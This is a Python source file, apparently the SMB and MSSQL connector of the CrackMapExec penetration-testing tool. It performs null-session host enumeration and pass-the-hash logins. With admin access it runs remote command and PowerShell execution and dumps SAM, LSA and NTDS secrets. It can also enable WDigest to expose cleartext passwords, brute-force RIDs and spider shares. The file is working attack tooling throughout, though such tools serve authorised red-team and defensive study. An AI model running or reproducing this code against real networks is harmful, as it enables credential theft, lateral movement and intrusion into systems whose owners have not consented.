from impacket.smbconnection import SMBConnection, SessionError
from impacket.nmb import NetBIOSError
from impacket import tds
from core.mssql import *
from impacket.dcerpc.v5.rpcrt import DCERPCException
from core.connection import Connection
from logging import getLogger
from core.logger import CMEAdapter
from core.context import Context
from core.helpers import create_ps_command
from StringIO import StringIO
from core.enum.shares import ShareEnum
from core.enum.uac import UAC
from core.enum.rpcquery import RPCQUERY
from core.enum.passpol import PassPolDump
from core.enum.users import SAMRDump
from core.enum.wmiquery import WMIQUERY
from core.enum.lookupsid import LSALookupSid
from core.credentials.secretsdump import DumpSecrets
from core.credentials.wdigest import WDIGEST
from core.spider.smbspider import SMBSpider
import socket

def connector(target, args, db, module, context, cmeserver):

    try:

        smb = SMBConnection(target, target, None, args.smb_port)

        #Get our IP from the socket
        local_ip = smb.getSMBServer().get_socket().getsockname()[0]

        #Get the remote ip address (in case the target is a hostname) 
        remote_ip = smb.getRemoteHost()

        try:
            smb.login('' , '')
        except SessionError as e:
            if "STATUS_ACCESS_DENIED" in e.message:
                pass

        domain     = smb.getServerDomain()
        servername = smb.getServerName()
        serveros   = smb.getServerOS()

        if not domain:
            domain = servername

        db.add_host(remote_ip, servername, domain, serveros)

        logger = CMEAdapter(getLogger('CME'), {'host': remote_ip, 'port': args.smb_port, 'hostname': u'{}'.format(servername)})

        logger.info(u"{} (name:{}) (domain:{})".format(serveros, servername.decode('utf-8'), domain.decode('utf-8')))

        try:
            '''
                DC's seem to want us to logoff first
                Windows workstations sometimes reset the connection, so we handle both cases here
                (go home Windows, you're drunk)
            '''
            smb.logoff()
        except NetBIOSError:
            pass
        except socket.error:
            pass

        if args.mssql:
            instances = None
            logger.extra['port'] = args.mssql_port
            ms_sql = tds.MSSQL(target, args.mssql_port, logger)
            ms_sql.connect()

            instances = ms_sql.getInstances(10)
            if len(instances) > 0:
                logger.info("Found {} MSSQL instance(s)".format(len(instances)))
                for i, instance in enumerate(instances):
                    logger.highlight("Instance {}".format(i))
                    for key in instance.keys():
                        logger.highlight(key + ":" + instance[key])

            try:
                ms_sql.disconnect()
            except:
                pass

        if args.username and (args.password or args.hash):
            conn = None

            if args.mssql and (instances is not None and len(instances) > 0):
                conn = tds.MSSQL(target, args.mssql_port, logger)
                conn.connect()
            elif not args.mssql:
                conn = SMBConnection(target, target, None, args.smb_port)

            if conn is None:
                return

            if args.domain:
                domain = args.domain

            connection = Connection(args, db, target, servername, domain, conn, logger, cmeserver)

            if (connection.password is not None or connection.hash is not None) and connection.username is not None:
                if module is not None:

                    module_logger = CMEAdapter(getLogger('CME'), {'module': module.name.upper(), 'host': remote_ip, 'port': args.smb_port, 'hostname': servername})
                    context = Context(db, module_logger, args)
                    context.localip  = local_ip

                    if hasattr(module, 'on_request') or hasattr(module, 'has_response'):
                        cmeserver.server.context.localip = local_ip

                    if hasattr(module, 'on_login'):
                        module.on_login(context, connection)

                    if hasattr(module, 'on_admin_login') and connection.admin_privs:
                        module.on_admin_login(context, connection)
                else:
                    if connection.admin_privs and (args.pscommand or args.command):

                        get_output = True if args.no_output is False else False
                        if args.mssql: args.exec_method = 'mssqlexec'

                        if args.command:
                            output = connection.execute(args.command, get_output=get_output, method=args.exec_method)

                        if args.pscommand:
                            output = connection.execute(create_ps_command(args.pscommand), get_output=get_output, method=args.exec_method)

                        logger.success('Executed command {}'.format('via {}'.format(args.exec_method) if args.exec_method else ''))
                        buf = StringIO(output).readlines()
                        for line in buf:
                            logger.highlight(line.strip())

                    if args.mssql and args.mssql_query:
                        conn.sql_query(args.mssql_query)
                        query_output = conn.printRows()
                        
                        logger.success('Executed MSSQL query')
                        buf = StringIO(query_output).readlines()
                        for line in buf:
                            logger.highlight(line.strip())

                    elif not args.mssql:

                        if connection.admin_privs and (args.sam or args.lsa or args.ntds):
                            secrets_dump = DumpSecrets(connection, logger)

                            if args.sam:
                                secrets_dump.SAM_dump()

                            if args.lsa:
                                secrets_dump.LSA_dump()

                            if args.ntds:
                                secrets_dump.NTDS_dump(args.ntds, args.ntds_pwdLastSet, args.ntds_history)

                        if connection.admin_privs and args.wdigest:
                            w_digest = WDIGEST(logger, connection.conn)

                            if args.wdigest == 'enable':
                                w_digest.enable()

                            elif args.wdigest == 'disable':
                                w_digest.disable()

                        if connection.admin_privs and args.uac:
                            UAC(connection.conn, logger).enum()

                        if args.spider:
                            spider = SMBSpider(logger, connection, args)
                            spider.spider(args.spider, args.depth)
                            spider.finish()

                        if args.enum_shares:
                            ShareEnum(connection.conn, logger).enum()

                        if args.enum_lusers or args.enum_disks or args.enum_sessions:
                            rpc_connection = RPCQUERY(connection, logger)

                            if args.enum_lusers:
                                rpc_connection.enum_lusers()

                            if args.enum_sessions:
                                rpc_connection.enum_sessions()

                            if args.enum_disks:
                                rpc_connection.enum_disks()

                        if args.pass_pol:
                            PassPolDump(logger, args.smb_port, connection).enum()

                        if args.enum_users:
                            SAMRDump(logger, args.smb_port, connection).enum()

                        if connection.admin_privs and args.wmi_query:
                            WMIQUERY(logger, connection, args.wmi_namespace).query(args.wmi_query)

                        if args.rid_brute:
                            LSALookupSid(logger, args.smb_port, connection, args.rid_brute).brute_force()

    except socket.error:
        return
